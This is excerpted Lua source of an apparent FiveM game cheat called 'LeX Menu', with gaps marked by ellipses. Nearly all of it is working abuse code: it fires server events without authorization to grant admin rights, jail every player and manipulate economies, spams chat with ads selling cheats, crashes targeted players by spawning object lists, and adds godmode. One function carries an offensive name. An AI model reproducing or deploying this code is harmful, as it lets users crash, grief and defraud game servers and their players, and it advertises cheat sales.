...
local G = 0.005;
local H = 0.370;
local I = "LeX 1.0 Coded by Pekinez#9362"
local
...
else aM("~h~Read #LeX-announcements on LeX Official Discord") end end;
local
...
function cG() for i = 0, 255 do x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do Citizen.Wait(0) RequestModel(GetHashKey("prop_fnclink_05crnr1")) end;
    ...
    function bananapartyall() Citizen.CreateThread(function() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2e^3X ^41^5.^60  ", {
                141, 211, 255
            }, "^"..av..
            "^1LeX^2Menu - ^4Come buy some ^6fivem cheats ^1https://discord.gg/kgEh8mb") end;
...
function RapeAllFunc() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1l^2e^3X ^41^5.^60", {
            141, 211, 255
        }, "^"..av..
        "^1LeX^2Menu - ^4Come buy some ^6fivem cheats ^1https://discord.gg/kgEh8mb") end;
...
Citizen.CreateThread(function() while bL do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), dM, 0) if SuperJump
    ...
    if blowall then
    for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "1L^2e^3X ^41^5.^60", {
            141, 211, 255
        }, "^"..av..
        "^1LeX^2Menu - ^4Come buy some ^6fivem cheats ^1https://discord.gg/kgEh8mb") end;
    ...
    function vrpdestroy() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "1L^2e^3X ^41^5.^60", {
            141, 211, 255
        }, "^"..av..
        "^1LeX^2Menu - ^4Come buy some ^6fivem cheats ^1https://discord.gg/kgEh8mb") end;
	...
	if chatspam then
                ...
                TriggerServerEvent('_chat:messageEntered', '^1L^2e^3X ^4M^6e^7n^8u', {0, 0x99, 255}, 'come buy some fivem cheats ^1https://discord.gg/kgEh8mb')
            end
			if BananaBoom then
                for i = 0, 128 do
                ...
                for i = 0, 256 do
                    if NetworkIsPlayerActive(i) then
                        local ped = GetPlayerPed(i)
                        local coords = GetEntityCoords(ped)
                        local vehiclehash = GetHashKey('ZR380')
    ...
    e.CreateMenu(bM, bN)  e.CreateMenu(bU, bM, I) e.CreateSubMenu(bO, bM, I) e.CreateSubMenu(bS, bM, I) e.CreateSubMenu(bT, bM, I) e.CreateSubMenu(d, bU) e.CreateSubMenu(bQ, bM, I) e.CreateSubMenu(bV, bM, I) e.CreateSubMenu(bW, bM, I) e.CreateSubMenu(bX, bW, I) e.CreateSubMenu(bY, bU, I) e.CreateSubMenu(bZ, bQ, I) e.CreateSubMenu(cb, bQ, I) e.CreateSubMenu(ca, bQ, I) e.CreateSubMenu(bR, bQ, I) e.CreateSubMenu(c0, bQ, I) e.CreateSubMenu(b_, bM, I) e.CreateSubMenu(co, bX, I) e.CreateSubMenu(c9, bX, I) e.CreateSubMenu(cq, bT, I) e.CreateSubMenu(cp, cq, I) e.CreateSubMenu(cj, cp, I) e.CreateSubMenu(cn, cj, I) e.CreateSubMenu(cm, bV, I) e.CreateSubMenu(ck, cm, I) e.CreateSubMenu(c1, ck, I) e.CreateSubMenu(c2, bV, I) e.CreateSubMenu(c3, c2, I) e.CreateSubMenu(cl, c3, I) e.CreateSubMenu(ch, bW, I) e.CreateSubMenu(c5, bU, I) e.CreateSubMenu(c4, bV, I) e.CreateSubMenu(cg, c4, I) e.CreateSubMenu(cf, c4, I) e.CreateSubMenu(ce, bX, I) e.CreateSubMenu(cd, bV, I) e.CreateSubMenu(cc, c9, I) e.CreateSubMenu(c7, bV, I) e.CreateSubMenu(c6, bU, I) e.CreateSubMenu(c8, bU, I) for i, eq in pairs(bC) do e.CreateSubMenu(eq.id, cg, eq.name) if eq.
    id == "paint"
    ...
    if e.IsMenuOpened(bM) then cr("~r~LeX - 1.0 - "..d, 0.80, 0.9) a5("Welcome back ~r~"..d..
        " ~s~!", 0.5, 0.5) aM("~h~LeX Menu - ~g~1~s~.~g~0", true) aM("~f~https://discord.gg/kgEh8mb ~p~LeX ~r~Discord", false) if e.MenuButton("~h~~p~#~s~ Self Menu", bO) then elseif e.MenuButton("~h~~p~#~s~ Online Players", bW) then elseif e.MenuButton("~h~~p~#~s~ Teleport Menu", bS) then elseif e.MenuButton("~h~~p~#~s~ Vehicle Menu", bV) then elseif e.MenuButton("~h~~p~#~s~ Weapon Menu", bT) then elseif e.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", bQ) then elseif e.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", bU) then elseif e.MenuButton("~h~~p~# ~p~LeX Credits", b_) then end; e.Display() elseif e.IsMenuOpened(bO) then a5("Stuff for yourself", 0.58, 0.58) if e.CheckBox("~h~~g~Godmode", Godmode, function(eC) Godmode = eC end) then elseif e.Button("~h~~y~Semi ~g~Godmode") then local eD = "stt_prop_stunt_soccer_ball"
    ...
    else ShootSingleBulletBetweenCoords(hecx, hecy, hecz + 10.0, hecx, hecy, hecz + 1.0, 1, 0, 0xB1CA77B1, cF, 1, 0, 0) end elseif e.Button("~h~~o~LeX ~r~CRASH ~s~Player ~o~_!_") then local cy = GetEntityCoords(GetPlayerPed(SelectedPlayer)) local cz = {
        0x9CF21E0F, 0x34315488, 0x6A27FEB1, 0xCB2ACC8, 0xC6899CDE, 0xD14B5BA3, 0xD9F4474C, 0x32A9996C, 0x69D4F974, 0xCAFC1EC3, 0x79B41171, 0x1075651, 0xC07792D4, 0x781E451D, 0x762657C6, 0xC2E75A21, 0xC3C00861, 0x81FB3FF0, 0x45EF7804, 0xE65EC0E4, 0xE764D794, 0xFBF7D21F, 0xE1AEB708, 0xA5E3D471, 0xD971BBAE, 0xCF7A9A9D, 0xC2CC99D8, 0x8FB233A4, 0x24E08E1F, 0x337B2B54, 0xB9402F87, 0x4F2526DA
    }
    ...
    e.Display() elseif e.IsMenuOpened(b_) then a5(";)", 0.29, 0.29) if e.Button("~h~~p~#~s~ Pekinez~r~#~r~9362 ~p~DEV") then aM("~h~~o~Dont click me BAKA!~s~.", false) aM("~h~~o~Nyaooww :3~s~.", false) aM("~h~~o~Very mad now cry qweqwe~s~.", false) elseif e.Button("~h~~p~#~s~ LeXon~r~#~r~8143 ~p~DEV") then end; e.Display() elseif e.IsMenuOpened(cq) then a5("Weapon list to give yourself", 0.58, 0.58) for eJ, eZ in pairs(bo) do
        if e.
    ...
    "LeX Menu injected successfully!") end, false) RegisterCommand("lol", function(f3, f4, f5) haharip = true; bananapartyall() EconomyDy2() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "^1LeX^2Menu - ^4Come buy some ^6fivem cheats ^1https://discord.gg/kgEh8mb") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "^1LeX^2Menu - ^4Come buy some ^6fivem cheats ^1https://discord.gg/kgEh8mb") TriggerServerEvent("ljail:jailplayer") end end, false) RegisterCommand("pk", function(f3, f4, f5) bL = false end, false)